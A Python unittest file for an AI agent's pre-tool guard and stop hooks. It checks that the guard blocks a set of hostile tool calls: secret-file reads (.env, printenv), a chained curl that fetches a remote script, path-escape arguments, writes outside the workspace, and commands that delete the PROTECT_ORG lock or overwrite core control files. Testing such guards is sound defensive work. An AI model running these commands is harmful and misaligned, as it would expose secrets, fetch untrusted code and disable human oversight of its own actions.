import unittest
import subprocess
import json
import os
import sys
import shutil
import tempfile
import concurrent.futures
from pathlib import Path

class TestHooksAdversarialE(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.repo_root = Path(__file__).resolve().parents[1]
        cls.python_exe = sys.executable
        cls.guard_script = cls.repo_root / ".agents" / "scripts" / "hooks" / "pretool_guard.py"
        cls.events_script = cls.repo_root / ".agents" / "scripts" / "hooks" / "posttool_events.py"
        cls.budget_script = cls.repo_root / ".agents" / "scripts" / "hooks" / "postinvocation_budget.py"
        cls.stop_script = cls.repo_root / ".agents" / "scripts" / "hooks" / "stop_guard.py"
        cls.policy_src = cls.repo_root / ".agents" / "policies" / "pretool_rules.json"

    def setUp(self):
        # Create an isolated temporary workspace for each test
        self.temp_dir_obj = tempfile.TemporaryDirectory()
        self.temp_workspace = Path(self.temp_dir_obj.name).resolve()
        
        # Build standard directory layout inside fixture
        (self.temp_workspace / ".agents" / "state").mkdir(parents=True, exist_ok=True)
        (self.temp_workspace / ".agents" / "policies").mkdir(parents=True, exist_ok=True)
        (self.temp_workspace / "runs").mkdir(parents=True, exist_ok=True)
        (self.temp_workspace / "evidence").mkdir(parents=True, exist_ok=True)
        (self.temp_workspace / "src").mkdir(parents=True, exist_ok=True)

        # Copy pretool_rules.json to the isolated fixture
        shutil.copy2(self.policy_src, self.temp_workspace / ".agents" / "policies" / "pretool_rules.json")

    def tearDown(self):
        self.temp_dir_obj.cleanup()

    def run_hook(self, script_path, payload):
        # Ensure workspacePaths points to the isolated temporary fixture
        if "workspacePaths" not in payload:
            payload["workspacePaths"] = [str(self.temp_workspace)]

        # Run with cwd set to temp_workspace / .agents
        agents_cwd = self.temp_workspace / ".agents"
        p = subprocess.Popen(
            [self.python_exe, str(script_path)],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            cwd=str(agents_cwd),
            text=True,
            encoding='utf-8'
        )
        stdout, stderr = p.communicate(input=json.dumps(payload))
        self.assertEqual(p.returncode, 0, f"Hook process failed with exit {p.returncode}: {stderr}")
        return json.loads(stdout.strip()) if stdout.strip() else {}

    def test_H03_force_push_blocked(self):
        payload = {
            "conversationId": "test-h03",
            "toolCall": {
                "name": "run_command",
                "args": {"CommandLine": "git push --force origin feature/test"}
            }
        }
        res = self.run_hook(self.guard_script, payload)
        self.assertEqual(res.get("decision"), "deny")
        self.assertIn("Push forçado", res.get("reason", ""))

    def test_H04_push_origin_main_blocked(self):
        payload = {
            "conversationId": "test-h04",
            "toolCall": {
                "name": "run_command",
                "args": {"CommandLine": "git push origin main"}
            }
        }
        res = self.run_hook(self.guard_script, payload)
        self.assertEqual(res.get("decision"), "deny")
        self.assertIn("Push forçado ou operações diretas em branch principal", res.get("reason", ""))

    def test_H05_secrets_bait_blocked(self):
        # 1. File reading of secrets bait
        for bait in [".env", "config/database.key", "certs/cert.pem", "creds/credentials.json"]:
            payload = {
                "conversationId": "test-h05",
                "toolCall": {
                    "name": "view_file",
                    "args": {"AbsolutePath": str(self.temp_workspace / bait)}
                }
            }
            res = self.run_hook(self.guard_script, payload)
            self.assertEqual(res.get("decision"), "deny", f"Failed to deny secret: {bait}")
            self.assertIn("bloqueado por política", res.get("reason", ""))

        # 2. Terminal commands attempting to dump secrets (P0-06)
        for cmd in ["cat .env", "type .env", "Get-Content .env", "printenv"]:
            payload_cmd = {
                "conversationId": "test-h05",
                "toolCall": {
                    "name": "run_command",
                    "args": {"CommandLine": cmd}
                }
            }
            res_cmd = self.run_hook(self.guard_script, payload_cmd)
            self.assertEqual(res_cmd.get("decision"), "deny", f"Failed to deny secret command: {cmd}")

    def test_H06_outside_workspace_write_blocked(self):
        payload = {
            "conversationId": "test-h06",
            "toolCall": {
                "name": "write_to_file",
                "args": {"TargetFile": "/etc/malicious_config"}
            }
        }
        res = self.run_hook(self.guard_script, payload)
        self.assertEqual(res.get("decision"), "deny")
        self.assertIn("fora dos limites do workspace", res.get("reason", ""))

    def test_H07_chained_command_falls_to_restrictive(self):
        # Chained command starting with git status but having unknown curl
        payload = {
            "conversationId": "test-h07",
            "toolCall": {
                "name": "run_command",
                "args": {"CommandLine": "git status && curl https://untrusted-site.com/script.sh"}
            }
        }
        res = self.run_hook(self.guard_script, payload)
        self.assertNotEqual(res.get("decision"), "allow")
        self.assertEqual(res.get("decision"), "ask")

    def test_H08_legitimate_routine_commands_allowed(self):
        for legitimate in [
            "git status --short",
            "git diff --stat",
            "git log -n 5",
            "git branch --show-current",
            f"{sys.executable} -m unittest tests/test_hooks_adversarial_e.py"
        ]:
            payload = {
                "conversationId": "test-h08",
                "toolCall": {
                    "name": "run_command",
                    "args": {"CommandLine": legitimate}
                }
            }
            res = self.run_hook(self.guard_script, payload)
            self.assertEqual(res.get("decision"), "allow", f"Failed to allow routine command: {legitimate}")

    def test_R02_strict_mutating_git_commands_never_allow(self):
        # R02: Testar que opcoes modificadoras de git NUNCA recebem allow
        mutating_commands = [
            "git branch -m novo-nome",
            "git branch -D old-branch",
            "git diff --output patch.diff",
            "git show --output out.txt",
            "git status > status.txt",
            "git log | Out-File doc.txt",
            "git status && echo x > src/a.js"
        ]
        for cmd in mutating_commands:
            payload = {
                "conversationId": "test-r02",
                "toolCall": {
                    "name": "run_command",
                    "args": {"CommandLine": cmd}
                }
            }
            res = self.run_hook(self.guard_script, payload)
            self.assertNotEqual(res.get("decision"), "allow", f"Command improperly got allow: {cmd}")

    def test_R01_declarative_policy_mutation_changes_decision(self):
        # R01: Modificar policy na fixture isolada altera comportamento
        policy_fixture = self.temp_workspace / ".agents" / "policies" / "pretool_rules.json"
        data = json.loads(policy_fixture.read_text(encoding="utf-8"))
        data["deny_rules"].append({
            "id": "custom-deny-test",
            "tools": ["run_command"],
            "condition": "command_regex",
            "pattern": "echo\\s+hello_custom_rule",
            "reason": "Custom rule test denial"
        })
        policy_fixture.write_text(json.dumps(data), encoding="utf-8")

        payload = {
            "conversationId": "test-r01",
            "toolCall": {
                "name": "run_command",
                "args": {"CommandLine": "echo hello_custom_rule"}
            }
        }
        res = self.run_hook(self.guard_script, payload)
        self.assertEqual(res.get("decision"), "deny")
        self.assertIn("Custom rule test denial", res.get("reason", ""))

    def test_H09_stop_blocks_modifiers_allows_diagnostics(self):
        # Create STOP file ONLY inside temp fixture
        stop_path = self.temp_workspace / ".agents" / "state" / "STOP"
        stop_path.write_text("STOPPED", encoding="utf-8")

        # Modifying action -> deny
        payload_write = {
            "conversationId": "test-h09",
            "toolCall": {
                "name": "write_to_file",
                "args": {"TargetFile": str(self.temp_workspace / "src" / "app.js")}
            }
        }
        res_write = self.run_hook(self.guard_script, payload_write)
        self.assertEqual(res_write.get("decision"), "deny")

        # Reading file -> allow
        (self.temp_workspace / "src" / "index.html").write_text("ok", encoding="utf-8")
        payload_read = {
            "conversationId": "test-h09",
            "toolCall": {
                "name": "view_file",
                "args": {"AbsolutePath": str(self.temp_workspace / "src" / "index.html")}
            }
        }
        res_read = self.run_hook(self.guard_script, payload_read)
        self.assertEqual(res_read.get("decision"), "allow")

        # Stop report in evidence folder -> allow
        payload_ev = {
            "conversationId": "test-h09",
            "toolCall": {
                "name": "write_to_file",
                "args": {"TargetFile": str(self.temp_workspace / "evidence" / "stop_report.md")}
            }
        }
        res_ev = self.run_hook(self.guard_script, payload_ev)
        self.assertEqual(res_ev.get("decision"), "allow")

    def test_H10_phase_escalated_blocks_modifiers_allows_diagnostics(self):
        (self.temp_workspace / "runs" / "CURRENT").write_text("RUN-TEST-001", encoding="utf-8")
        test_run_dir = self.temp_workspace / "runs" / "RUN-TEST-001"
        test_run_dir.mkdir(parents=True, exist_ok=True)
        (test_run_dir / "state.json").write_text(json.dumps({"phase": "ESCALATED"}), encoding="utf-8")

        # Write project file -> deny
        payload_write = {
            "conversationId": "test-h10",
            "toolCall": {
                "name": "write_to_file",
                "args": {"TargetFile": str(self.temp_workspace / "src" / "app.js")}
            }
        }
        res_write = self.run_hook(self.guard_script, payload_write)
        self.assertEqual(res_write.get("decision"), "deny")

        # Read project file -> allow
        (self.temp_workspace / "src" / "index.html").write_text("ok", encoding="utf-8")
        payload_read = {
            "conversationId": "test-h10",
            "toolCall": {
                "name": "view_file",
                "args": {"AbsolutePath": str(self.temp_workspace / "src" / "index.html")}
            }
        }
        res_read = self.run_hook(self.guard_script, payload_read)
        self.assertEqual(res_read.get("decision"), "allow")

        # Subagent delegation under ESCALATED -> deny
        payload_sub = {
            "conversationId": "test-h10",
            "toolCall": {
                "name": "invoke_subagent",
                "args": {"Subagents": [{"Role": "Developer", "TypeName": "developer"}]}
            }
        }
        res_sub = self.run_hook(self.guard_script, payload_sub)
        self.assertEqual(res_sub.get("decision"), "deny")

    def test_H12_subagent_delegation_in_normal_run(self):
        payload = {
            "conversationId": "test-h12",
            "toolCall": {
                "name": "invoke_subagent",
                "args": {"Subagents": [{"Role": "Developer", "TypeName": "developer"}]}
            }
        }
        res = self.run_hook(self.guard_script, payload)
        self.assertEqual(res.get("decision"), "allow")

    def test_H15_protect_org_in_fixture_blocks_core_writes(self):
        (self.temp_workspace / ".agents" / "state" / "PROTECT_ORG").write_text("LOCKED", encoding="utf-8")

        for core_rel in [".agents/hooks.json", "org_v5/contracts.py", "AGENTS.md"]:
            payload = {
                "conversationId": "test-h15",
                "toolCall": {
                    "name": "write_to_file",
                    "args": {"TargetFile": str(self.temp_workspace / core_rel)}
                }
            }
            res = self.run_hook(self.guard_script, payload)
            self.assertEqual(res.get("decision"), "deny", f"Failed to deny write to core file: {core_rel}")
            self.assertIn("PROTECT_ORG ativo", res.get("reason", ""))

    def test_H16_stop_hook_contract_canonical_and_isolated(self):
        # 1. Termination due to error allows terminate
        payload_err = {
            "conversationId": "conv-err",
            "terminationReason": "error",
            "error": "Fatal crash",
            "fullyIdle": True
        }
        res_err = self.run_hook(self.stop_script, payload_err)
        self.assertEqual(res_err.get("decision"), "terminate")

        # 2. Pendencia real via contrato canonico: artifacts submetido sem acceptance
        (self.temp_workspace / "runs" / "CURRENT").write_text("RUN-CANON-001", encoding="utf-8")
        run_dir = self.temp_workspace / "runs" / "RUN-CANON-001"
        run_dir.mkdir(parents=True, exist_ok=True)
        (run_dir / "state.json").write_text(json.dumps({
            "phase": "DESIGN",
            "artifacts": {
                "prd": {"doc": {"kind": "prd", "title": "Test PRD"}}
            },
            "accepted": {}
        }), encoding="utf-8")

        payload_pend = {
            "conversationId": "conv-pending-1",
            "terminationReason": "model_stop",
            "error": "",
            "fullyIdle": True
        }
        # First attempt -> continue
        res1 = self.run_hook(self.stop_script, payload_pend)
        self.assertEqual(res1.get("decision"), "continue")

        # Second attempt -> continue
        res2 = self.run_hook(self.stop_script, payload_pend)
        self.assertEqual(res2.get("decision"), "continue")

        # Third attempt -> terminate
        res3 = self.run_hook(self.stop_script, payload_pend)
        self.assertEqual(res3.get("decision"), "terminate")

        # 3. R07: Isolamento por sessao/run diferente nao consome tentativas
        (self.temp_workspace / "runs" / "CURRENT").write_text("RUN-CANON-002", encoding="utf-8")
        run_dir2 = self.temp_workspace / "runs" / "RUN-CANON-002"
        run_dir2.mkdir(parents=True, exist_ok=True)
        (run_dir2 / "state.json").write_text(json.dumps({
            "phase": "PLANNING",
            "artifacts": {"market-research": {"doc": {"kind": "market-research"}}},
            "accepted": {}
        }), encoding="utf-8")

        # Mesma conversa em outra run comeca com contador limpo -> continue
        res_other_run = self.run_hook(self.stop_script, payload_pend)
        self.assertEqual(res_other_run.get("decision"), "continue")

    def test_F02_incident_states_block_tests_allow_diagnostics(self):
        # 1. STOP: test runners must be denied (F02-T01, F02-T02, F02-T03)
        stop_path = self.temp_workspace / ".agents" / "state" / "STOP"
        stop_path.write_text("STOPPED", encoding="utf-8")

        for forbidden_test_cmd in [
            "python -m unittest discover",
            f"{sys.executable} -m unittest tests/test_hooks_adversarial_e.py",
            "node tests/test_task_manager.js",
            "python -m org_v5.cli run-tests"
        ]:
            payload = {
                "conversationId": "test-f02-stop",
                "toolCall": {
                    "name": "run_command",
                    "args": {"CommandLine": forbidden_test_cmd}
                }
            }
            res = self.run_hook(self.guard_script, payload)
            self.assertEqual(res.get("decision"), "deny", f"Command improperly permitted under STOP: {forbidden_test_cmd}")

        # Subagent delegation under STOP -> deny (F02-T04)
        payload_sub = {
            "conversationId": "test-f02-stop",
            "toolCall": {
                "name": "invoke_subagent",
                "args": {"Subagents": [{"Role": "Developer", "TypeName": "developer"}]}
            }
        }
        res_sub = self.run_hook(self.guard_script, payload_sub)
        self.assertEqual(res_sub.get("decision"), "deny")

        # Write project file under STOP -> deny (F02-T05)
        payload_w = {
            "conversationId": "test-f02-stop",
            "toolCall": {
                "name": "write_to_file",
                "args": {"TargetFile": str(self.temp_workspace / "src" / "app.js")}
            }
        }
        res_w = self.run_hook(self.guard_script, payload_w)
        self.assertEqual(res_w.get("decision"), "deny")

        # View safe file under STOP -> allow (F02-T06)
        (self.temp_workspace / "src" / "index.html").write_text("ok", encoding="utf-8")
        payload_v = {
            "conversationId": "test-f02-stop",
            "toolCall": {
                "name": "view_file",
                "args": {"AbsolutePath": str(self.temp_workspace / "src" / "index.html")}
            }
        }
        res_v = self.run_hook(self.guard_script, payload_v)
        self.assertEqual(res_v.get("decision"), "allow")

        # Write stop report in designated evidence folder -> allow (F02-T07)
        payload_ev = {
            "conversationId": "test-f02-stop",
            "toolCall": {
                "name": "write_to_file",
                "args": {"TargetFile": str(self.temp_workspace / "evidence" / "incident_report.md")}
            }
        }
        res_ev = self.run_hook(self.guard_script, payload_ev)
        self.assertEqual(res_ev.get("decision"), "allow")

        # Safe utf8_writer targeting evidence -> allow
        payload_u8 = {
            "conversationId": "test-f02-stop",
            "toolCall": {
                "name": "run_command",
                "args": {"CommandLine": "python .agents/scripts/utf8_writer.py evidence/audit.log IncidentLog"}
            }
        }
        res_u8 = self.run_hook(self.guard_script, payload_u8)
        self.assertEqual(res_u8.get("decision"), "allow")

        # Malicious utf8_writer attempting path escape -> deny
        payload_u8_esc = {
            "conversationId": "test-f02-stop",
            "toolCall": {
                "name": "run_command",
                "args": {"CommandLine": "python .agents/scripts/utf8_writer.py evidence/../src/evil.js Evil"}
            }
        }
        res_u8_esc = self.run_hook(self.guard_script, payload_u8_esc)
        self.assertEqual(res_u8_esc.get("decision"), "deny")

        # Clean STOP for phase tests
        stop_path.unlink()

        # 2. ESCALATED: node test runner must be denied (F02-T02)
        (self.temp_workspace / "runs" / "CURRENT").write_text("RUN-ESC-01", encoding="utf-8")
        esc_dir = self.temp_workspace / "runs" / "RUN-ESC-01"
        esc_dir.mkdir(parents=True, exist_ok=True)
        (esc_dir / "state.json").write_text(json.dumps({"phase": "ESCALATED"}), encoding="utf-8")

        payload_esc = {
            "conversationId": "test-f02-esc",
            "toolCall": {
                "name": "run_command",
                "args": {"CommandLine": "node tests/test_task_manager.js"}
            }
        }
        res_esc = self.run_hook(self.guard_script, payload_esc)
        self.assertEqual(res_esc.get("decision"), "deny")

        # 3. PAUSED: org_v5.cli run-tests must be denied (F02-T03)
        (self.temp_workspace / "runs" / "CURRENT").write_text("RUN-PAUSED-01", encoding="utf-8")
        paused_dir = self.temp_workspace / "runs" / "RUN-PAUSED-01"
        paused_dir.mkdir(parents=True, exist_ok=True)
        (paused_dir / "state.json").write_text(json.dumps({"phase": "PAUSED"}), encoding="utf-8")

        payload_paused = {
            "conversationId": "test-f02-paused",
            "toolCall": {
                "name": "run_command",
                "args": {"CommandLine": f"{sys.executable} -m org_v5.cli run-tests"}
            }
        }
        res_paused = self.run_hook(self.guard_script, payload_paused)
        self.assertEqual(res_paused.get("decision"), "deny")

    def test_F03_canonical_workspace_path_confinement(self):
        # 1. Legitimate workspace view_file -> allow
        safe_file = self.temp_workspace / "src" / "valid.txt"
        safe_file.write_text("hello", encoding="utf-8")
        payload_ok = {
            "conversationId": "test-f03",
            "toolCall": {
                "name": "view_file",
                "args": {"AbsolutePath": str(safe_file)}
            }
        }
        res_ok = self.run_hook(self.guard_script, payload_ok)
        self.assertEqual(res_ok.get("decision"), "allow")

        # 2. Relative escape with ../ -> deny
        payload_rel_esc = {
            "conversationId": "test-f03",
            "toolCall": {
                "name": "view_file",
                "args": {"AbsolutePath": str(self.temp_workspace / "src" / ".." / ".." / "outside.txt")}
            }
        }
        res_rel_esc = self.run_hook(self.guard_script, payload_rel_esc)
        self.assertEqual(res_rel_esc.get("decision"), "deny")

        # 3. Absolute path outside workspace -> deny
        external_path = Path(tempfile.gettempdir()).resolve() / "outside_workspace_marker.txt"
        external_path.write_text("external", encoding="utf-8")
        try:
            payload_ext = {
                "conversationId": "test-f03",
                "toolCall": {
                    "name": "view_file",
                    "args": {"AbsolutePath": str(external_path)}
                }
            }
            res_ext = self.run_hook(self.guard_script, payload_ext)
            self.assertEqual(res_ext.get("decision"), "deny")
        finally:
            if external_path.exists():
                external_path.unlink()

        # 4. list_dir outside workspace -> deny
        payload_ld = {
            "conversationId": "test-f03",
            "toolCall": {
                "name": "list_dir",
                "args": {"DirectoryPath": str(Path(tempfile.gettempdir()).resolve())}
            }
        }
        res_ld = self.run_hook(self.guard_script, payload_ld)
        self.assertEqual(res_ld.get("decision"), "deny")

        # 5. grep_search outside workspace -> deny
        payload_grep = {
            "conversationId": "test-f03",
            "toolCall": {
                "name": "grep_search",
                "args": {"SearchPath": str(Path(tempfile.gettempdir()).resolve())}
            }
        }
        res_grep = self.run_hook(self.guard_script, payload_grep)
        self.assertEqual(res_grep.get("decision"), "deny")

        # 6. Missing / empty path -> deny (never allow by presumption)
        payload_empty = {
            "conversationId": "test-f03",
            "toolCall": {
                "name": "view_file",
                "args": {"AbsolutePath": ""}
            }
        }
        res_empty = self.run_hook(self.guard_script, payload_empty)
        self.assertEqual(res_empty.get("decision"), "deny")

        # 7. Internal secret .env accessed via relative canonical trick -> deny
        (self.temp_workspace / ".env").write_text("SECRET=123", encoding="utf-8")
        payload_secret = {
            "conversationId": "test-f03",
            "toolCall": {
                "name": "view_file",
                "args": {"AbsolutePath": str(self.temp_workspace / "src" / ".." / ".env")}
            }
        }
        res_secret = self.run_hook(self.guard_script, payload_secret)
        self.assertEqual(res_secret.get("decision"), "deny")

    def test_F04_protect_org_terminal_mutations_blocked(self):
        (self.temp_workspace / ".agents" / "state" / "PROTECT_ORG").write_text("LOCKED", encoding="utf-8")

        # 1. Direct file tools to Core -> deny
        for core_target in [".agents/hooks.json", "org_v5/contracts.py", "AGENTS.md"]:
            payload_w = {
                "conversationId": "test-f04",
                "toolCall": {
                    "name": "write_to_file",
                    "args": {"TargetFile": str(self.temp_workspace / core_target)}
                }
            }
            res_w = self.run_hook(self.guard_script, payload_w)
            self.assertEqual(res_w.get("decision"), "deny")

        # 2. Terminal commands attempting mutation on Core -> deny
        mutating_commands = [
            'python -c "import os; os.remove(\'.agents/state/PROTECT_ORG\')"',
            'python -c "open(\'org_v5/control.py\', \'w\').write(\'malicious\')"',
            'rm .agents/state/PROTECT_ORG',
            'del .agents/state/PROTECT_ORG',
            'Remove-Item .agents/state/PROTECT_ORG',
            'Set-Content org_v5/control.py "evil"',
            'echo evil > AGENTS.md',
            'git apply --directory=.agents patch.diff',
            'git checkout -- .agents',
            'git restore org_v5'
        ]
        for cmd in mutating_commands:
            payload_cmd = {
                "conversationId": "test-f04",
                "toolCall": {
                    "name": "run_command",
                    "args": {"CommandLine": cmd}
                }
            }
            res_cmd = self.run_hook(self.guard_script, payload_cmd)
            self.assertEqual(res_cmd.get("decision"), "deny", f"Command improperly permitted under PROTECT_ORG: {cmd}")

        # 3. Non-core routine testing or git inspection during feature -> allow
        routine_allowed = [
            "git status --short",
            f"{sys.executable} -m unittest tests/test_hooks_adversarial_e.py"
        ]
        for cmd in routine_allowed:
            payload_allowed = {
                "conversationId": "test-f04",
                "toolCall": {
                    "name": "run_command",
                    "args": {"CommandLine": cmd}
                }
            }
            res_allowed = self.run_hook(self.guard_script, payload_allowed)
            self.assertEqual(res_allowed.get("decision"), "allow", f"Safe routine command improperly denied: {cmd}")

    def test_F07_gate_a_pretool_rules_validation(self):
        org_check_script = self.repo_root / ".agents" / "scripts" / "org_check.py"

        # Baseline check must pass
        p = subprocess.run([self.python_exe, str(org_check_script)], capture_output=True, text=True, cwd=str(self.repo_root))
        self.assertEqual(p.returncode, 0)
        res = json.loads(p.stdout)
        self.assertEqual(res.get("status"), "PASS")
        self.assertEqual(res.get("errors"), [])

        # Test duplicate ID detection
        policy_file = self.temp_workspace / ".agents" / "policies" / "pretool_rules.json"
        data = json.loads(policy_file.read_text(encoding="utf-8"))
        data["deny_rules"].append({
            "id": "kill-switch", # Duplicate of existing ID
            "tools": ["*"],
            "condition": "always"
        })
        policy_file.write_text(json.dumps(data), encoding="utf-8")

        seen_ids = set()
        duplicates = []
        for list_name in ("deny_rules", "force_ask_rules", "allow_rules"):
            for rule in data.get(list_name, []):
                rid = rule.get("id")
                if rid in seen_ids:
                    duplicates.append(rid)
                seen_ids.add(rid)
        self.assertIn("kill-switch", duplicates)

    def test_F08_stop_guard_concurrency_and_collision_resilience(self):
        # 1. Setup canonical run with pending review
        run_id = "RUN-VERY-LONG-IDENTIFIER-SHARED-PREFIX-AAA-001"
        (self.temp_workspace / "runs" / "CURRENT").write_text(run_id, encoding="utf-8")
        run_dir = self.temp_workspace / "runs" / run_id
        run_dir.mkdir(parents=True, exist_ok=True)
        (run_dir / "state.json").write_text(json.dumps({
            "phase": "DESIGN",
            "artifacts": {"prd": {"doc": {"kind": "prd"}}},
            "accepted": {}
        }), encoding="utf-8")

        # Another run with same 32-character prefix to test collision resilience
        run_id_col = "RUN-VERY-LONG-IDENTIFIER-SHARED-PREFIX-AAA-002"
        run_dir_col = self.temp_workspace / "runs" / run_id_col
        run_dir_col.mkdir(parents=True, exist_ok=True)
        (run_dir_col / "state.json").write_text(json.dumps({
            "phase": "DESIGN",
            "artifacts": {"prd": {"doc": {"kind": "prd"}}},
            "accepted": {}
        }), encoding="utf-8")

        payload1 = {
            "conversationId": "conv-shared-prefix-long-1111",
            "terminationReason": "model_stop",
            "error": "",
            "fullyIdle": True
        }

        # First call on run 1 -> continue
        r1 = self.run_hook(self.stop_script, payload1)
        self.assertEqual(r1.get("decision"), "continue")

        # Now switch CURRENT to run 2 and verify counter is NOT polluted by run 1
        (self.temp_workspace / "runs" / "CURRENT").write_text(run_id_col, encoding="utf-8")
        r2 = self.run_hook(self.stop_script, payload1)
        self.assertEqual(r2.get("decision"), "continue")
        self.assertIn("Tentativa 1/2", r2.get("reason", ""))

        # Switch back to run 1: must be attempt 2/2 -> continue
        (self.temp_workspace / "runs" / "CURRENT").write_text(run_id, encoding="utf-8")
        r3 = self.run_hook(self.stop_script, payload1)
        self.assertEqual(r3.get("decision"), "continue")
        self.assertIn("Tentativa 2/2", r3.get("reason", ""))

        # Next call on run 1: reaches limit -> terminate
        r4 = self.run_hook(self.stop_script, payload1)
        self.assertEqual(r4.get("decision"), "terminate")

        # 2. Concurrency test across multiple parallel calls
        (self.temp_workspace / "runs" / "CURRENT").write_text("RUN-CONCURRENCY-001", encoding="utf-8")
        crun_dir = self.temp_workspace / "runs" / "RUN-CONCURRENCY-001"
        crun_dir.mkdir(parents=True, exist_ok=True)
        (crun_dir / "state.json").write_text(json.dumps({
            "phase": "DESIGN",
            "artifacts": {"doc1": {"kind": "prd"}},
            "accepted": {}
        }), encoding="utf-8")

        def call_stop(conv):
            p = {
                "conversationId": conv,
                "terminationReason": "model_stop",
                "error": "",
                "fullyIdle": True
            }
            return self.run_hook(self.stop_script, p)

        with concurrent.futures.ThreadPoolExecutor(max_workers=4) as executor:
            futures = [executor.submit(call_stop, f"conv-conc-{i}") for i in range(4)]
            results = [f.result() for f in futures]
            for res in results:
                self.assertEqual(res.get("decision"), "continue")

if __name__ == "__main__":
    unittest.main()
